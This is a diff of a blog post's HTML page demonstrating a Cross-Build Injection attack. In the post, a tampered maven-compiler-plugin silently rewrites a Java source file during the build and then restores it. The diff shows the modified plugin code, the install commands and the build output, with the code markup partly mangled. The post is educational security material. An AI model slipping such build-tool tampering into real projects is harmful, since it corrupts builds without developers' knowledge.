@@ -10,10 +10,10 @@
 
     <link href="http://feeds.feedburner.com/BranchAndBound" rel="alternate" title="Branch and Bound Blog Feed" type="application/atom+xml" />
     <!-- Le styles -->
-    <link href="/assets/themes/sander/bootstrap/css/bootstrap.css" rel="stylesheet">
-    <link href="/assets/themes/sander/bootstrap/css/bootstrap-responsive.css" rel="stylesheet">
-    <link href="/assets/themes/sander/syntax.css" rel="stylesheet">
-    <link href="/assets/themes/sander/style.css" rel="stylesheet">
+    <link href="/assets/themes//bootstrap/css/bootstrap.css" rel="stylesheet">
+    <link href="/assets/themes//bootstrap/css/bootstrap-responsive.css" rel="stylesheet">
+    <link href="/assets/themes//syntax.css" rel="stylesheet">
+    <link href="/assets/themes//style.css" rel="stylesheet">
 
     <style type="text/css">
       body {
@@ -87,14 +87,13 @@
 
 <p>So how do we get this innocent snippet of Java:</p>
 
-<div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+<p><figure class="highlight"><pre><code class="language-java" data-lang="java"><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span></p>
 
-  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+<p>  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
     <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Hi there&quot;</span><span class="o">);</span>
-  <span class="o">}</span> 
+  <span class="o">}</span></p>
 
-<span class="o">}</span></code></pre></div>
-
+<p><span class="o">}</span></code></pre></figure></p>
 
 <p>to print "Hi, you've been p0wned" rather than the bland "Hi there" message using a Cross-Build Injection attack? The central premise of my <a href="/blog/security/2012/03/crossbuild-injection-how-safe-is-your-build">Cross-Build Injection Attacks</a> talk is that this depends on how secure your build setup is. Let's take a look at a typical Maven-based setup. When we do a "mvn clean install" on the project containing the Test class, the following happens:</p>
 
@@ -106,37 +105,38 @@
 
 <p>Rather than creating a network setup that intercepts and replaces Maven request/responses, let's just place a compromised artifact in our local repository manually, to simulate the effects of an XBI attack. Since the maven-compiler-plugin orchestrates the actual invocation of the Java compiler, it seems like a good place to subvert the build process. Fortunately the source is just an <a href="http://svn.apache.org/repos/asf/maven/plugins/tags/maven-compiler-plugin-2.5.1">svn checkout</a> away. A little digging finds us the AbstractCompilerMojo class, containing an execute() method which ultimately invokes the compiler. So let's get to it and change it to our liking:</p>
 
-<div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">AbstractCompilerMojo</span> <span class="kd">extends</span> <span class="n">AbstractMojo</span> <span class="o">{</span>
+<p><figure class="highlight"><pre><code class="language-java" data-lang="java"><span></span><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">AbstractCompilerMojo</span> <span class="kd">extends</span> <span class="n">AbstractMojo</span> <span class="o">{</span></p>
 
-  <span class="c1">// ... snipped lots of code ...</span>
+<p>  <span class="c1">// ... snipped lots of code ...</span></p>
 
-  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">execute</span><span class="o">()</span> 
-    <span class="kd">throws</span> <span class="n">MojoExecutionException</span><span class="o">,</span> <span class="n">CompilationFailureException</span> <span class="o">{</span>
-    
-    <span class="n">File</span> <span class="n">src</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">File</span><span class="o">(</span><span class="n">basedir</span> <span class="o">+</span> <span class="s">&quot;/src/main/java/Test.java&quot;</span><span class="o">);</span>
-    <span class="n">String</span> <span class="n">original</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-    <span class="k">try</span> <span class="o">{</span>
-        <span class="n">original</span> <span class="o">=</span> <span class="n">FileUtils</span><span class="o">.</span><span class="na">fileRead</span><span class="o">(</span><span class="n">src</span><span class="o">);</span>
-        <span class="n">String</span> <span class="n">replaced</span> <span class="o">=</span> <span class="n">original</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot; there&quot;</span><span class="o">,</span> <span class="s">&quot;, you been p0wned!&quot;</span><span class="o">);</span>
-        <span class="n">FileUtils</span><span class="o">.</span><span class="na">fileWrite</span><span class="o">(</span><span class="n">src</span><span class="o">,</span> <span class="n">replaced</span><span class="o">);</span>
-    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
-    <span class="o">}</span>
+<p>  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">execute</span><span class="o">()</span>
+    <span class="kd">throws</span> <span class="n">MojoExecutionException</span><span class="o">,</span> <span class="n">CompilationFailureException</span> <span class="o">{</span></p>
 
-    <span class="k">try</span> <span class="o">{</span>
-        <span class="c1">// original body of execute() here, calling the </span>
-        <span class="c1">// compiler with the replaced source...</span>
-    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">FileUtils</span><span class="o">.</span><span class="na">fileWrite</span><span class="o">(</span><span class="n">src</span><span class="o">,</span> <span class="n">original</span><span class="o">);</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-  <span class="o">}</span> 
+<pre><code>&lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;basedir&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/src/main/java/Test.java&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;original&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+&lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;original&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;FileUtils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;fileRead&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;replaced&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;original&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;replace&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot; there&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;, you been p0wned!&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;FileUtils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;fileWrite&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;replaced&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+&lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;RuntimeException&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+&lt;span class="o"&gt;}&lt;/span&gt;
 
-<span class="o">}</span></code></pre></div>
+&lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+    &lt;span class="c1"&gt;// original body of execute() here, calling the &lt;/span&gt;
+    &lt;span class="c1"&gt;// compiler with the replaced source...&lt;/span&gt;
+&lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;finally&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;FileUtils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;fileWrite&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;original&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;RuntimeException&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+&lt;span class="o"&gt;}&lt;/span&gt;
+</code></pre>
 
+<p>  <span class="o">}</span></p>
+
+<p><span class="o">}</span></code></pre></figure></p>
 
 <p>(For the lazy bunch, here's the code (including the modified maven-compiler-plugin) in a convenient <a href="/dl/xbi_code.zip">download</a>.)</p>
 
@@ -144,8 +144,7 @@
 
 <p>To bring our version of the maven-compiler-plugin in place, execute</p>
 
-<div class="highlight"><pre><code class="language-sh" data-lang="sh">:maven-compiler-plugin<span class="nv">$ </span>mvn clean install -DskipTests</code></pre></div>
-
+<p><figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span></span>:maven-compiler-plugin$ mvn clean install -DskipTests</code></pre></figure></p>
 
 <p>in the maven-compiler-plugin project that we just 'improved'. The skipTests flag is necessary since our 'improvement' obviously fails any sensible unit test in the compiler plugin. Now this nefarious version of the compiler plugin lives in your local repository.</p>
 
@@ -153,19 +152,18 @@
 
 <p>Just two more steps to see our 'improved' compiler plugin in action. Perform a mvn clean install on the 'hacked' project, and run it:</p>
 
-<div class="highlight"><pre><code class="language-sh" data-lang="sh">:hacked<span class="nv">$ </span>mvn clean install
+<p><figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span></span>:hacked$ mvn clean install
 .. snipped ..
 <span class="o">[</span>INFO<span class="o">]</span> --- maven-compiler-plugin:2.5.1:compile <span class="o">(</span>default-compile<span class="o">)</span> @ hacked ---
-<span class="o">[</span>INFO<span class="o">]</span> Compiling <span class="m">1</span> <span class="nb">source </span>file to .../hacked/target/classes
+<span class="o">[</span>INFO<span class="o">]</span> Compiling <span class="m">1</span> <span class="nb">source</span> file to .../hacked/target/classes
 .. snipped ..
 <span class="o">[</span>INFO<span class="o">]</span> -------------------------------------------------------------------
 <span class="o">[</span>INFO<span class="o">]</span> BUILD SUCCESS
 <span class="o">[</span>INFO<span class="o">]</span> -------------------------------------------------------------------
-.. snipped ..
+.. snipped ..</p>
 
-:hacked<span class="nv">$ </span>java -cp ./target/classes Test
-Hi, you<span class="err">&#39;</span>ve been p0wned!</code></pre></div>
-
+<p>:hacked$ java -cp ./target/classes Test
+Hi, you<span class="err">&#39;</span>ve been p0wned!</code></pre></figure></p>
 
 <p>There you have it: when compiled using this maven-compiler-plugin implementation, our original class seems to be untouched but the resulting .class file will print the unexpected message. And remember, we use a plain and uncompromised install of both Maven and the Java compiler. However, because Maven downloads a plugin before compiling, arbitrary code may be executed if you are not careful!</p>
 
@@ -184,7 +182,7 @@ Hi, you<span class="err">&#39;</span>ve been p0wned!</code></pre></div>
 </article>
 <div>
   <strong>If you liked this post, please share it!</strong>
-  <a href="https://twitter.com/share" class="twitter-share-button" data-url="http://branchandbound.net/blog/security/2012/10/cross-build-injection-in-action" data-via="Sander_Mak" data-dnt="true">Tweet</a>
+  <a href="https://twitter.com/share" class="twitter-share-button" data-url="http://branchandbound.net/blog/security/2012/10/cross-build-injection-in-action/" data-via="Sander_Mak" data-dnt="true">Tweet</a>
   <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 </div>
 
@@ -195,11 +193,11 @@ Hi, you<span class="err">&#39;</span>ve been p0wned!</code></pre></div>
   <h3>Related Posts</h3>
   <ul class="posts">
     
-      <li><span>23 Mar 2012</span> &raquo; <a href="/blog/security/2012/03/crossbuild-injection-how-safe-is-your-build">Cross-build injection attacks: how safe is your build?</a></li>
+      <li><span>23 Mar 2012</span> &raquo; <a href="/blog/security/2012/03/crossbuild-injection-how-safe-is-your-build/">Cross-build injection attacks: how safe is your build?</a></li>
     
-      <li><span>27 Oct 2015</span> &raquo; <a href="/blog/java/2015/10/osgi-to-jigsaw">From OSGi to Jigsaw</a></li>
+      <li><span>27 Oct 2015</span> &raquo; <a href="/blog/java/2015/10/osgi-to-jigsaw/">From OSGi to Jigsaw</a></li>
     
-      <li><span>10 Sep 2015</span> &raquo; <a href="/blog/java/2015/09/java-module-system-first-look">The Java Module system: a first look</a></li>
+      <li><span>10 Sep 2015</span> &raquo; <a href="/blog/java/2015/09/java-module-system-first-look/">The Java Module system: a first look</a></li>
     
   </ul>
 </div>
@@ -230,7 +228,7 @@ Hi, you<span class="err">&#39;</span>ve been p0wned!</code></pre></div>
         </div>
         <div class="span3">
          <div class="hero-unit sidebar">
-           <a href="http://feeds.feedburner.com/BranchAndBound"><img class="rss pull-right" title="Branch and Bound Blog RSS Feed" alt="RSS Feed" src="/assets/themes/sander/rss.png"></a>
+           <a href="http://feeds.feedburner.com/BranchAndBound"><img class="rss pull-right" title="Branch and Bound Blog RSS Feed" alt="RSS Feed" src="/assets/themes//rss.png"></a>
            <h4 class="sidebar"><strong>Branch and Bound Blog</strong></h4>
            <em>... pruning the software universe</em> 
            <hr>
@@ -238,10 +236,10 @@ Hi, you<span class="err">&#39;</span>ve been p0wned!</code></pre></div>
              <li><a href="/about.html">About Sander</a></li>
            </ul>
            <span class="sidebar pull-right">
-             <a href="http://www.twitter.com/Sander_Mak" target="_blank"><img title="Twitter" alt="Twitter" class="small" src="/assets/themes/sander/twitter.png"></a>
-             <a href="http://nl.linkedin.com/in/SanderMak" target="_blank"><img title="Linkedin profile" alt="Linkedin profile" class="small" src="/assets/themes/sander/linkedin.png"><a>
-             <a href="http://www.github.com/SanderMak" target="_blank"><img  title="GitHub" alt="GitHub" class="small" src="/assets/themes/sander/github.png"></a>
-             <a href="http://www.slideshare.net/SanderMak/presentations" target="_blank"><img title="Slideshare presentations"  alt="Slideshare presentations" class="small" src="/assets/themes/sander/slideshare.png"></a>
+             <a href="http://www.twitter.com/Sander_Mak" target="_blank"><img title="Twitter" alt="Twitter" class="small" src="/assets/themes//twitter.png"></a>
+             <a href="http://nl.linkedin.com/in/SanderMak" target="_blank"><img title="Linkedin profile" alt="Linkedin profile" class="small" src="/assets/themes//linkedin.png"><a>
+             <a href="http://www.github.com/SanderMak" target="_blank"><img  title="GitHub" alt="GitHub" class="small" src="/assets/themes//github.png"></a>
+             <a href="http://www.slideshare.net/SanderMak/presentations" target="_blank"><img title="Slideshare presentations"  alt="Slideshare presentations" class="small" src="/assets/themes//slideshare.png"></a>
            </span>
            <hr>
            <h5 class="sidebar">&nbsp;View archive by:</h5>
@@ -303,7 +301,7 @@ Hi, you<span class="err">&#39;</span>ve been p0wned!</code></pre></div>
 
     <!-- Scripts at the end for faster loading. -->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
-    <script src="/assets/themes/sander/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
+    <script src="/assets/themes//bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
    
 
     <script type="text/javascript">
